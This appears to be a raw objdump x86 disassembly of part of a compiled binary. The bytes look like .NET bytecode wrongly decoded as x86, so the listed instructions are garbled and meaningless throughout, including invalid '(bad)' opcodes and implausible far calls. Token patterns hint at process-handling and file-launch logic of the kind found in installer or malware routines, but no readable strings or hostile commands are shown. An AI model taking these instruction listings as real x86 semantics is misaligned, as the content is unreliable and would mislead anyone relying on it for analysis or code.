  4040ed:	00 6a 30             	add    %ch,0x30(%edx)
  4040f0:	1b 02                	sbb    (%edx),%eax
  4040f2:	20 cd                	and    %cl,%ch
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 6f 62             	add    %ch,0x62(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 02                	or     (%edx),%al
  4040fd:	03 68 28             	add    0x28(%eax),%ebp
  404100:	29 00                	sub    %eax,(%eax)
  404102:	00 06                	add    %al,(%esi)
  404104:	16                   	push   %ss
  404105:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  404108:	00 00                	add    %al,(%eax)
  40410a:	0a 2a                	or     (%edx),%ch
  40410c:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  404112:	20 ce                	and    %cl,%dh
  404114:	00 00                	add    %al,(%eax)
  404116:	00 6f 62             	add    %ch,0x62(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 02                	or     (%edx),%al
  40411d:	03 69 28             	add    0x28(%ecx),%ebp
  404120:	28 00                	sub    %al,(%eax)
  404122:	00 06                	add    %al,(%esi)
  404124:	16                   	push   %ss
  404125:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 2a                	or     (%edx),%ch
  40412c:	02 20                	add    (%eax),%ah
  40412e:	d3 00                	roll   %cl,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	6f                   	outsl  %ds:(%esi),(%dx)
  404133:	62 00                	bound  %eax,(%eax)
  404135:	00 0a                	add    %cl,(%edx)
  404137:	02 03                	add    (%ebx),%al
  404139:	28 27                	sub    %ah,(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	16                   	push   %ss
  40413f:	1e                   	push   %ds
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	4c                   	dec    %esp
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 2a                	or     (%edx),%ch
  404146:	03 20                	add    (%eax),%esp
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  404150:	20 d3                	and    %dl,%bl
  404152:	00 00                	add    %al,(%eax)
  404154:	00 6f 62             	add    %ch,0x62(%edi)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 02                	or     (%edx),%al
  40415b:	03 28                	add    (%eax),%ebp
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	06                   	push   %es
  404161:	16                   	push   %ss
  404162:	1e                   	push   %ds
  404163:	6f                   	outsl  %ds:(%esi),(%dx)
  404164:	4c                   	dec    %esp
  404165:	00 00                	add    %al,(%eax)
  404167:	0a 2a                	or     (%edx),%ch
  404169:	03 20                	add    (%eax),%esp
  40416b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404171:	1b 02                	sbb    (%edx),%eax
  404173:	20 d2                	and    %dl,%dl
  404175:	00 00                	add    %al,(%eax)
  404177:	00 6f 62             	add    %ch,0x62(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 02                	or     (%edx),%al
  40417e:	03 69 28             	add    0x28(%ecx),%ebp
  404181:	28 00                	sub    %al,(%eax)
  404183:	00 06                	add    %al,(%esi)
  404185:	16                   	push   %ss
  404186:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404189:	00 00                	add    %al,(%eax)
  40418b:	0a 2a                	or     (%edx),%ch
  40418d:	03 1f                	add    (%edi),%ebx
  40418f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404193:	02 20                	add    (%eax),%ah
  404195:	d1 00                	roll   $1,(%eax)
  404197:	00 00                	add    %al,(%eax)
  404199:	6f                   	outsl  %ds:(%esi),(%dx)
  40419a:	62 00                	bound  %eax,(%eax)
  40419c:	00 0a                	add    %cl,(%edx)
  40419e:	02 03                	add    (%ebx),%al
  4041a0:	68 28 29 00 00       	push   $0x2928
  4041a5:	06                   	push   %es
  4041a6:	16                   	push   %ss
  4041a7:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 2a                	or     (%edx),%ch
  4041ae:	03 1f                	add    (%edi),%ebx
  4041b0:	e0 6a                	loopne 0x40421c
  4041b2:	30 14 02             	xor    %dl,(%edx,%eax,1)
  4041b5:	20 d0                	and    %dl,%al
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	00 6f 62             	add    %ch,0x62(%edi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	0a 02                	or     (%edx),%al
  4041c0:	03 d2                	add    %edx,%edx
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	62 00                	bound  %eax,(%eax)
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	2a 02                	sub    (%edx),%al
  4041c9:	03 d2                	add    %edx,%edx
  4041cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cc:	62 00                	bound  %eax,(%eax)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	2a 00                	sub    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	06                   	push   %es
  4041d7:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 7e 05             	adc    %edi,0x5(%esi)
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	04 28                	add    $0x28,%al
  4041e6:	85 00                	test   %eax,(%eax)
  4041e8:	00 0a                	add    %cl,(%edx)
  4041ea:	7e 06                	jle    0x4041f2
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 28                	add    $0x28,%al
  4041f0:	86 00                	xchg   %al,(%eax)
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	73 87                	jae    0x40417d
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 0a                	or     (%edx),%cl
  4041fa:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  404200:	89 00                	mov    %eax,(%eax)
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	8a 00                	mov    (%eax),%al
  404207:	00 0a                	add    %cl,(%edx)
  404209:	06                   	push   %es
  40420a:	6f                   	outsl  %ds:(%esi),(%dx)
  40420b:	8b 00                	mov    (%eax),%eax
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  404216:	02 00                	add    (%eax),%al
  404218:	00 16                	add    %dl,(%esi)
  40421a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40421d:	10 20                	adc    %ah,(%eax)
  40421f:	e8 03 00 00 28       	call   0x28404227
  404224:	14 00                	adc    $0x0,%al
  404226:	00 0a                	add    %cl,(%edx)
  404228:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40422b:	58                   	pop    %eax
  40422c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40422f:	04 1f                	add    $0x1f,%al
  404231:	0a 32                	or     (%edx),%dh
  404233:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  40423a:	05 16 13 06 2b       	add    $0x2b061316,%eax
  40423f:	32 11                	xor    (%ecx),%dl
  404241:	05 11 06 9a 13       	add    $0x139a0611,%eax
  404246:	07                   	pop    %es
  404247:	11 07                	adc    %eax,(%edi)
  404249:	6f                   	outsl  %ds:(%esi),(%dx)
  40424a:	89 00                	mov    %eax,(%eax)
  40424c:	00 0a                	add    %cl,(%edx)
  40424e:	6f                   	outsl  %ds:(%esi),(%dx)
  40424f:	8a 00                	mov    (%eax),%al
  404251:	00 0a                	add    %cl,(%edx)
  404253:	06                   	push   %es
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	8b 00                	mov    (%eax),%eax
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 27                	sub    %ah,(%edi)
  40425b:	00 00                	add    %al,(%eax)
  40425d:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404260:	11 07                	adc    %eax,(%edi)
  404262:	6f                   	outsl  %ds:(%esi),(%dx)
  404263:	8e 00                	mov    (%eax),%es
  404265:	00 0a                	add    %cl,(%edx)
  404267:	de 03                	fiadds (%ebx)
  404269:	26 de 00             	fiadds %es:(%eax)
  40426c:	11 06                	adc    %eax,(%esi)
  40426e:	17                   	pop    %ss
  40426f:	58                   	pop    %eax
  404270:	13 06                	adc    (%esi),%eax
  404272:	11 06                	adc    %eax,(%esi)
  404274:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  40427a:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404280:	7e 73                	jle    0x4042f5
  404282:	8f 00                	pop    (%eax)
  404284:	00 0a                	add    %cl,(%edx)
  404286:	13 08                	adc    (%eax),%ecx
  404288:	11 08                	adc    %ecx,(%eax)
  40428a:	73 90                	jae    0x40421c
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 13                	or     (%ebx),%dl
  404290:	09 11                	or     %edx,(%ecx)
  404292:	09 72 4d             	or     %esi,0x4d(%edx)
  404295:	21 00                	and    %eax,(%eax)
  404297:	70 6f                	jo     0x404308
  404299:	91                   	xchg   %eax,%ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 11                	or     (%ecx),%dl
  40429e:	09 1b                	or     %ebx,(%ebx)
  4042a0:	8d 39                	lea    (%ecx),%edi
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	01 25 16 72 67 21    	add    %esp,0x21677216
  4042aa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4042ad:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	0a 28                	or     (%eax),%ch
  4042b6:	92                   	xchg   %eax,%edx
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	0a a2 25 18 72 bb    	or     -0x448de7db(%edx),%ah
  4042bf:	21 00                	and    %eax,(%eax)
  4042c1:	70 a2                	jo     0x404265
  4042c3:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	0a a2 25 1a 72 cf    	or     -0x308de5db(%edx),%ah
  4042d0:	21 00                	and    %eax,(%eax)
  4042d2:	70 a2                	jo     0x404276
  4042d4:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  4042da:	94                   	xchg   %eax,%esp
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	0a 11                	or     (%ecx),%dl
  4042df:	09 17                	or     %edx,(%edi)
  4042e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042e2:	95                   	xchg   %eax,%ebp
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 11                	or     (%ecx),%dl
  4042e7:	09 17                	or     %edx,(%edi)
  4042e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ea:	96                   	xchg   %eax,%esi
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 11                	or     (%ecx),%dl
  4042ef:	09 6f 97             	or     %ebp,-0x69(%edi)
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 11                	or     (%ecx),%dl
  4042f6:	08 6f 98             	or     %ch,-0x68(%edi)
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	0a 26                	or     (%esi),%ah
  4042fd:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  404301:	00 00                	add    %al,(%eax)
  404303:	0a 72 d5             	or     -0x2b(%edx),%dh
  404306:	21 00                	and    %eax,(%eax)
  404308:	70 28                	jo     0x404332
  40430a:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 13                	or     (%ebx),%dl
  404315:	0a 11                	or     (%ecx),%dl
  404317:	0a 06                	or     (%esi),%al
  404319:	6f                   	outsl  %ds:(%esi),(%dx)
  40431a:	8b 00                	mov    (%eax),%eax
  40431c:	00 0a                	add    %cl,(%edx)
  40431e:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  404324:	33 22                	xor    (%edx),%esp
  404326:	00 70 06             	add    %dh,0x6(%eax)
  404329:	6f                   	outsl  %ds:(%esi),(%dx)
  40432a:	8b 00                	mov    (%eax),%eax
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	72 33                	jb     0x404363
  404330:	22 00                	and    (%eax),%al
  404332:	70 28                	jo     0x40435c
  404334:	9c                   	pushf
  404335:	00 00                	add    %al,(%eax)
  404337:	0a 6f 9d             	or     -0x63(%edi),%ch
  40433a:	00 00                	add    %al,(%eax)
  40433c:	0a de                	or     %dh,%bl
  40433e:	0c 11                	or     $0x11,%al
  404340:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404343:	11 0a                	adc    %ecx,(%edx)
  404345:	6f                   	outsl  %ds:(%esi),(%dx)
  404346:	33 00                	xor    (%eax),%eax
  404348:	00 0a                	add    %cl,(%edx)
  40434a:	dc 06                	faddl  (%esi)
  40434c:	6f                   	outsl  %ds:(%esi),(%dx)
  40434d:	8b 00                	mov    (%eax),%eax
  40434f:	00 0a                	add    %cl,(%edx)
  404351:	28 73 00             	sub    %dh,0x0(%ebx)
  404354:	00 0a                	add    %cl,(%edx)
  404356:	2c 15                	sub    $0x15,%al
  404358:	06                   	push   %es
  404359:	6f                   	outsl  %ds:(%esi),(%dx)
  40435a:	8b 00                	mov    (%eax),%eax
  40435c:	00 0a                	add    %cl,(%edx)
  40435e:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  404364:	e8 03 00 00 28       	call   0x2840436c
  404369:	14 00                	adc    $0x0,%al
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	06                   	push   %es
  40436e:	6f                   	outsl  %ds:(%esi),(%dx)
  40436f:	8b 00                	mov    (%eax),%eax
  404371:	00 0a                	add    %cl,(%edx)
  404373:	17                   	pop    %ss
  404374:	73 77                	jae    0x4043ed
  404376:	00 00                	add    %al,(%eax)
  404378:	0a 28                	or     (%eax),%ch
  40437a:	88 00                	mov    %al,(%eax)
  40437c:	00 0a                	add    %cl,(%edx)
  40437e:	6f                   	outsl  %ds:(%esi),(%dx)
  40437f:	89 00                	mov    %eax,(%eax)
  404381:	00 0a                	add    %cl,(%edx)
  404383:	6f                   	outsl  %ds:(%esi),(%dx)
  404384:	8a 00                	mov    (%eax),%al
  404386:	00 0a                	add    %cl,(%edx)
  404388:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  40438e:	25 07 16 07 8e       	and    $0x8e071607,%eax
  404393:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  40439a:	18 00                	sbb    %al,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	20 00                	and    %al,(%eax)
  4043a0:	00 71 02             	add    %dh,0x2(%ecx)
  4043a3:	20 00                	and    %al,(%eax)
  4043a5:	40                   	inc    %eax
  4043a6:	0d 03 6f 19 00       	or     $0x196f03,%eax
  4043ab:	00 0a                	add    %cl,(%edx)
  4043ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4043b1:	01 0c 73             	add    %ecx,(%ebx,%esi,2)
  4043b4:	18 00                	sbb    %al,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	08 6f a0             	or     %ch,-0x60(%edi)
  4043bb:	00 00                	add    %al,(%eax)
  4043bd:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  4043c3:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  4043ca:	41                   	inc    %ecx
  4043cb:	00 00                	add    %al,(%eax)
  4043cd:	0a 28                	or     (%eax),%ch
  4043cf:	82 00 00             	addb   $0x0,(%eax)
  4043d2:	06                   	push   %es
  4043d3:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  4043d9:	37                   	aaa
  4043da:	22 00                	and    (%eax),%al
  4043dc:	70 28                	jo     0x404406
  4043de:	51                   	push   %ecx
  4043df:	00 00                	add    %al,(%eax)
  4043e1:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  4043e7:	00 0a                	add    %cl,(%edx)
  4043e9:	13 0b                	adc    (%ebx),%ecx
  4043eb:	11 0b                	adc    %ecx,(%ebx)
  4043ed:	72 41                	jb     0x404430
  4043ef:	22 00                	and    (%eax),%al
  4043f1:	70 6f                	jo     0x404462
  4043f3:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4043f8:	0b 72 55             	or     0x55(%edx),%esi
  4043fb:	22 00                	and    (%eax),%al
  4043fd:	70 6f                	jo     0x40446e
  4043ff:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  404404:	0b 72 75             	or     0x75(%edx),%esi
  404407:	22 00                	and    (%eax),%al
  404409:	70 06                	jo     0x404411
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	8b 00                	mov    (%eax),%eax
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	72 33                	jb     0x404445
  404412:	22 00                	and    (%eax),%al
  404414:	70 28                	jo     0x40443e
  404416:	9c                   	pushf
  404417:	00 00                	add    %al,(%eax)
  404419:	0a 6f a3             	or     -0x5d(%edi),%ch
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 11                	or     (%ecx),%dl
  404420:	0b 72 8b             	or     -0x75(%edx),%esi
  404423:	22 00                	and    (%eax),%al
  404425:	70 28                	jo     0x40444f
  404427:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404428:	00 00                	add    %al,(%eax)
  40442a:	0a 28                	or     (%eax),%ch
  40442c:	51                   	push   %ecx
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 6f a3             	or     -0x5d(%edi),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 11                	or     (%ecx),%dl
  404436:	0b 72 93             	or     -0x6d(%edx),%esi
  404439:	22 00                	and    (%eax),%al
  40443b:	70 09                	jo     0x404446
  40443d:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  404443:	9f                   	lahf
  404444:	22 00                	and    (%eax),%al
  404446:	70 28                	jo     0x404470
  404448:	9c                   	pushf
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40444e:	00 00                	add    %al,(%eax)
  404450:	0a de                	or     %dh,%bl
  404452:	0c 11                	or     $0x11,%al
  404454:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  404457:	11 0b                	adc    %ecx,(%ebx)
  404459:	6f                   	outsl  %ds:(%esi),(%dx)
  40445a:	33 00                	xor    (%eax),%eax
  40445c:	00 0a                	add    %cl,(%edx)
  40445e:	dc 73 90             	fdivl  -0x70(%ebx)
  404461:	00 00                	add    %al,(%eax)
  404463:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	25 17 6f 96 00       	and    $0x966f17,%eax
  404470:	00 0a                	add    %cl,(%edx)
  404472:	25 16 6f a6 00       	and    $0xa66f16,%eax
  404477:	00 0a                	add    %cl,(%edx)
  404479:	25 16 6f a7 00       	and    $0xa76f16,%eax
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	25 17 6f 95 00       	and    $0x956f17,%eax
  404485:	00 0a                	add    %cl,(%edx)
  404487:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  40448d:	16                   	push   %ss
  40448e:	28 16                	sub    %dl,(%esi)
  404490:	00 00                	add    %al,(%eax)
  404492:	0a de                	or     %dh,%bl
  404494:	03 26                	add    (%esi),%esp
  404496:	de 00                	fiadds (%eax)
  404498:	2a 00                	sub    (%eax),%al
  40449a:	00 00                	add    %al,(%eax)
  40449c:	41                   	inc    %ecx
  40449d:	64 00 00             	add    %al,%fs:(%eax)
  4044a0:	00 00                	add    %al,(%eax)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	67 00 00             	add    %al,(%bx,%si)
  4044a7:	00 22                	add    %ah,(%edx)
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	00 01                	add    %al,(%ecx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 02                	add    %eax,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	00 36                	add    %dh,(%esi)
  4044bd:	01 00                	add    %eax,(%eax)
  4044bf:	00 29                	add    %ch,(%ecx)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 5f 01             	add    %bl,0x1(%edi)
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	0c 00                	or     $0x0,%al
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0b 02                	or     (%edx),%eax
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	68 00 00 00 73       	push   $0x73000000
  4044dd:	02 00                	add    (%eax),%al
  4044df:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	b5 02                	mov    $0x2,%ch
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	b5 02                	mov    $0x2,%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	03 00                	add    (%eax),%eax
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	02 00                	add    (%eax),%al
  404504:	2e 00 00             	add    %al,%cs:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 21                	adc    %esp,(%ecx)
  40450d:	00 22                	add    %ah,(%edx)
  40450f:	e2 33                	loop   0x404544
  404511:	0e                   	push   %cs
  404512:	00 00                	add    %al,(%eax)
  404514:	00 0a                	add    %cl,(%edx)
  404516:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  40451c:	ab                   	stos   %eax,%es:(%edi)
  40451d:	00 00                	add    %al,(%eax)
  40451f:	0a 73 ac             	or     -0x54(%ebx),%dh
  404522:	00 00                	add    %al,(%eax)
  404524:	0a 28                	or     (%eax),%ch
  404526:	ad                   	lods   %ds:(%esi),%eax
  404527:	00 00                	add    %al,(%eax)
  404529:	0a 06                	or     (%esi),%al
  40452b:	30 04 17             	xor    %al,(%edi,%edx,1)
  40452e:	0b de                	or     %esi,%ebx
  404530:	07                   	pop    %es
  404531:	de 03                	fiadds (%ebx)
  404533:	26 de 00             	fiadds %es:(%eax)
  404536:	16                   	push   %ss
  404537:	2a 07                	sub    (%edi),%al
  404539:	2a 00                	sub    (%eax),%al
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 27                	add    %ah,(%edi)
  404545:	27                   	daa
  404546:	00 03                	add    %al,(%ebx)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	02 00                	add    (%eax),%al
  404550:	28 00                	sub    %al,(%eax)
  404552:	00 00                	add    %al,(%eax)
  404554:	02 00                	add    (%eax),%al
  404556:	00 11                	add    %dl,(%ecx)
  404558:	73 ae                	jae    0x404508
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	af                   	scas   %es:(%edi),%eax
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 6f 5b             	or     0x5b(%edi),%ch
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 72 af             	or     -0x51(%edx),%dh
  404569:	22 00                	and    (%eax),%al
  40456b:	70 6f                	jo     0x4045dc
  40456d:	b0 00                	mov    $0x0,%al
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	2c 04                	sub    $0x4,%al
  404573:	17                   	pop    %ss
  404574:	0a de                	or     %dh,%bl
  404576:	07                   	pop    %es
  404577:	de 03                	fiadds (%ebx)
  404579:	26 de 00             	fiadds %es:(%eax)
  40457c:	16                   	push   %ss
  40457d:	2a 06                	sub    (%esi),%al
  40457f:	2a 01                	sub    (%ecx),%al
  404581:	10 00                	adc    %al,(%eax)
  404583:	00 00                	add    %al,(%eax)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 21                	add    %ah,(%ecx)
  404589:	21 00                	and    %eax,(%eax)
  40458b:	03 01                	add    (%ecx),%eax
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 1b                	add    %ebx,(%ebx)
  404591:	30 02                	xor    %al,(%edx)
  404593:	00 d0                	add    %dl,%al
  404595:	00 00                	add    %al,(%eax)
  404597:	00 19                	add    %bl,(%ecx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	11 72 b5             	adc    %esi,-0x4b(%edx)
  40459e:	22 00                	and    (%eax),%al
  4045a0:	70 73                	jo     0x404615
  4045a2:	b1 00                	mov    $0x0,%cl
  4045a4:	00 0a                	add    %cl,(%edx)
  4045a6:	0a 06                	or     (%esi),%al
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	b2 00                	mov    $0x0,%dl
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	0b 07                	or     (%edi),%eax
  4045af:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b0:	b3 00                	mov    $0x0,%bl
  4045b2:	00 0a                	add    %cl,(%edx)
  4045b4:	0c 2b                	or     $0x2b,%al
  4045b6:	7c 08                	jl     0x4045c0
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	b4 00                	mov    $0x0,%ah
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	0d 09 72 fb 22       	or     $0x22fb7209,%eax
  4045c2:	00 70 6f             	add    %dh,0x6f(%eax)
  4045c5:	b5 00                	mov    $0x0,%ch
  4045c7:	00 0a                	add    %cl,(%edx)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cf:	5b                   	pop    %ebx
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 13                	or     (%ebx),%dl
  4045d4:	04 11                	add    $0x11,%al
  4045d6:	04 72                	add    $0x72,%al
  4045d8:	15 23 00 70 28       	adc    $0x28700023,%eax
  4045dd:	27                   	daa
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4045e3:	09 72 41             	or     %esi,0x41(%edx)
  4045e6:	23 00                	and    (%eax),%eax
  4045e8:	70 6f                	jo     0x404659
  4045ea:	b5 00                	mov    $0x0,%ch
  4045ec:	00 0a                	add    %cl,(%edx)
  4045ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ef:	38 00                	cmp    %al,(%eax)
  4045f1:	00 0a                	add    %cl,(%edx)
  4045f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f4:	b6 00                	mov    $0x0,%dh
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	72 4d                	jb     0x404647
  4045fa:	23 00                	and    (%eax),%eax
  4045fc:	70 6f                	jo     0x40466d
  4045fe:	b0 00                	mov    $0x0,%al
  404600:	00 0a                	add    %cl,(%edx)
  404602:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  404607:	5d                   	pop    %ebp
  404608:	23 00                	and    (%eax),%eax
  40460a:	70 6f                	jo     0x40467b
  40460c:	b0 00                	mov    $0x0,%al
  40460e:	00 0a                	add    %cl,(%edx)
  404610:	2d 1c 09 72 41       	sub    $0x4172091c,%eax
  404615:	23 00                	and    (%eax),%eax
  404617:	70 6f                	jo     0x404688
  404619:	b5 00                	mov    $0x0,%ch
  40461b:	00 0a                	add    %cl,(%edx)
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	38 00                	cmp    %al,(%eax)
  404620:	00 0a                	add    %cl,(%edx)
  404622:	72 6b                	jb     0x40468f
  404624:	23 00                	and    (%eax),%eax
  404626:	70 28                	jo     0x404650
  404628:	27                   	daa
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  404632:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 3a                	or     (%edx),%bh
  40463a:	79 ff                	jns    0x40463b
  40463c:	ff                   	(bad)
  40463d:	ff                   	lcall  (bad)
  40463e:	de 0a                	fimuls (%edx)
  404640:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404643:	08 6f 33             	or     %ch,0x33(%edi)
  404646:	00 00                	add    %al,(%eax)
  404648:	0a dc                	or     %ah,%bl
  40464a:	de 0a                	fimuls (%edx)
  40464c:	07                   	pop    %es
  40464d:	2c 06                	sub    $0x6,%al
  40464f:	07                   	pop    %es
  404650:	6f                   	outsl  %ds:(%esi),(%dx)
  404651:	33 00                	xor    (%eax),%eax
  404653:	00 0a                	add    %cl,(%edx)
  404655:	dc de                	(bad)
  404657:	0a 06                	or     (%esi),%al
  404659:	2c 06                	sub    $0x6,%al
  40465b:	06                   	push   %es
  40465c:	6f                   	outsl  %ds:(%esi),(%dx)
  40465d:	33 00                	xor    (%eax),%eax
